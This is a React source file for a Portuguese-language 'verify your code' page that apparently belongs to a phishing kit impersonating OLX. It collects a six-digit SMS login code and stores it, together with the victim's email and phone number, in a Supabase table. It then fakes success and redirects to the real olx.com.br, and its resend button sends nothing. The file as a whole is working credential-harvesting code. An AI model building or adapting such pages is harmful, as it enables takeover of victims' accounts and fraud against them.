import { useState, useRef, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { Mail, Info } from 'lucide-react';
import { toast } from "sonner";
import { supabase } from "@/lib/supabaseClient";

const VerifyCode = () => {
    const navigate = useNavigate();
    const [code, setCode] = useState(["", "", "", "", "", ""]);
    const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
    const phone = localStorage.getItem("user_phone");
    const email = localStorage.getItem("user_email");
    useEffect(() => {
        inputRefs.current[0]?.focus();
    }, []);

  const saveCodeToSupabase = async (codigoCompleto: string) => {
    if (!email) {
        toast.error("Email não encontrado. Faça login novamente.");
        return false;
    }

    try {
        const { error } = await supabase
            .from('codigos_verificacao_celular')
            .insert([
                { 
                    verificacao: codigoCompleto,  // ← Este campo está correto
                    email: email,
                    codigo: phone  // ← Use 'codigo' se for o nome da coluna para o telefone
                }
            ]);

        if (error) {
            console.error('Erro supabase:', error);
            toast.error("Erro ao salvar o código: " + error.message);
            return false;
        }
        
        console.log('Código salvo com sucesso:', codigoCompleto); // ← Log para debug
        return true;
    } catch (err) {
        console.error(err);
        toast.error("Erro inesperado ao salvar.");
        return false;
    }
};


    const handleChange = async (index: number, value: string) => {
        if (value.length > 1) value = value[0];
        if (!/^\d*$/.test(value)) return;

        const newCode = [...code];
        newCode[index] = value;
        setCode(newCode);

        if (value && index < 5) inputRefs.current[index + 1]?.focus();

        // Auto submit quando os 6 dígitos forem preenchidos
        if (newCode.every(digit => digit !== "") && index === 5) {
            const codigoString = newCode.join("");

            const salvou = await saveCodeToSupabase(codigoString);

            if (salvou) {
                toast.success("Código verificado!");
                setTimeout(() => {
                  window.location.href = "https://www.olx.com.br";
                }, 500);
            }
        }
    };

    const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
        if (e.key === "Backspace" && !code[index] && index > 0) {
            inputRefs.current[index - 1]?.focus();
        }
    };

    const handleResend = () => {
        toast.success("Código reenviado!");
        setCode(["", "", "", "", "", ""]);
        inputRefs.current[0]?.focus();
    };

    return (
        <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4">
            <div className="w-full max-w-md bg-white rounded-2xl shadow-sm border border-gray-200 p-8">
                <div className="space-y-6">
                    
                    <div className="text-center">
                        <h1 className="text-2xl font-semibold text-gray-900 mb-3">
                            Acesse sua conta
                        </h1>
                        <p className="text-sm text-gray-600">
                            Digite o código enviado para
                        </p>
                        <p className="text-sm text-gray-900 font-medium mt-1">
                            {phone}
                        </p>
                    </div>

                    <div className="flex gap-2 justify-center">
                        {code.map((digit, index) => (
                            <input
                                key={index}
                                ref={(el) => (inputRefs.current[index] = el)}
                                type="text"
                                inputMode="numeric"
                                maxLength={1}
                                value={digit}
                                onChange={(e) => handleChange(index, e.target.value)}
                                onKeyDown={(e) => handleKeyDown(index, e)}
                                className="w-12 h-14 text-center text-xl font-semibold rounded-lg border-2 border-gray-300 transition-all focus:ring-2 focus:ring-indigo-500 focus:border-indigo-500 hover:border-gray-400"
                            />
                        ))}
                    </div>

                    <div className="text-left">
                        <button
                            onClick={handleResend}
                            className="text-sm text-indigo-600 hover:underline font-medium"
                        >
                            Reenviar código
                        </button>
                    </div>

                    <div>
                        <div className="space-y-3 bg-gray-50 rounded-lg p-4 mb-2">
                            <div className="flex gap-3 items-start">
                                <Mail className="w-5 h-5 text-gray-600 mt-0.5" />
                                <p className="text-sm text-gray-700">
                                    Caso não tenha encontrado o SMS, verifique permissões de mensagens.
                                </p>
                            </div>
                        </div>

                        <div className="space-y-3 bg-gray-50 rounded-lg p-4">
                            <div className="flex gap-3 items-start">
                                <Info className="w-5 h-5 text-gray-600 mt-0.5" />
                                <p className="text-sm text-gray-700">
                                    O código é privado. Não compartilhe com ninguém.
                                </p>
                            </div>
                        </div>
                    </div>

                    <div className="text-left pt-2">
                        <button
                            onClick={() => navigate('/auth')}
                            className="text-sm text-indigo-600 hover:underline font-medium"
                        >
                            Voltar
                        </button>
                    </div>

                </div>
            </div>
        </div>
    );
};

export default VerifyCode;
